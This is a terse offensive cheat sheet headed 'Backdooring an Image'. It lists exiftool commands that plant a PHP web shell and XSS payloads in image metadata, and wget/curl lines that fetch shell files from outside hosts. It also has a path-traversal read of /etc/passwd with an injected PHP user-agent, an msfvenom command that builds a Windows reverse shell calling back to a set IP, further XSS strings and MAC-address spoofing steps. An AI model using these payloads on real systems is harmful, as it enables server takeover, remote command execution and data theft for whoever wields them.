####Backdooring an Image####
exiftool -DocumentName="<h1>Nic0la T3sl4<br><?php if(isset(\$_REQUEST['cmd'])){echo '<pre>';\$cmd = (\$_REQUEST['cmd']);system(\$cmd);echo '</pre>';} __halt_compiler();?></h1>" images.jpeg
exiftool -DocumentName="><img src=x onerror=alert(1)>" file.php.jpg
exiftool -DocumentName="<?php phpinfo(); __halt_compiler(); ?>" /root/imagen.jpg

<?php wget http://www.urlshell.com -O shell.php ?>
curl -o hidden.txt https://url.website.com/shell.txt
cat file.jpg shell.php > compress.jpg
curl -u www.servervul.com/page.php?id=/../../etc/passwd -A "<?php system('ls -l'); ?>"
msfvenom -p windows/shell_reverse_tcp LHOST=191.234.190.137 LPORT=4444 -f exe -o shell.exe

"><svg/onload=alert(document.domain)>
data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=

php //filter/convert.base64-encode/resource=

*************Change Mac address(privileges root)*******************
# ifconfig [interface] down
# ifconfig [interface] hw ether 00:11:22:33:44:55
# ifconfig [interface] up
**************************************************
